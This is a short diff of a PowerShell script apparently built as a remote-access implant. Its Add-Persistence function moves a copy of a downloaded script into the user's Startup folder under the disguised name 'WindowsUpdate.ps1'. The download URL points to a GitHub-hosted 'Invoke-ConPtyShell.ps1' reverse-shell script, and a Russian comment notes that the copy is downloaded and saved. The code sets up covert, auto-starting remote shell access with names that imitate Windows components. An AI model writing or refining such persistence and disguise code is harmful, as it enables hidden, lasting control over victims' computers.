@@ -16,7 +16,7 @@ function Connect-ZiPo {
 
     function Add-Persistence {
     try {
-        $targetPath = "$env:APPDATA\Microsoft\Windows Defender\updater.ps1"
+        $targetPath = "$env:APPDATA\Microsoft\Windows\StartMenu\Programs\Startup\WindowsUpdate.ps1"
         $url = "https://raw.githubusercontent.com/zipo0/studytime-/main/Invoke-ConPtyShell.ps1"
 
         # Скачиваем и сохраняем копию скрипта
